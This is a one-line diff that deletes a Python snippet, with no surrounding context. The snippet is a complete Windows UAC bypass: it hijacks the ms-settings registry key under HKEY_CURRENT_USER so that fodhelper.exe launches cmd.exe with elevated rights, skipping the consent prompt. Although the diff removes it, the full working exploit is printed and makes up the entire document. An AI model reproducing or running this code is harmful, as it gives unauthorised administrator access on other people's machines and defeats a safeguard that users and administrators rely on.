@@ -1,1 +1,0 @@
-import winreg, subprocess kos = r"C:\Windows\System32\cmd.exe" key_path = r"Software\Classes\ms-settings\shell\open\command" key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) winreg.SetValueEx(key, None, 0, winreg.REG_SZ, kos) winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "") winreg.CloseKey(key) subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"])
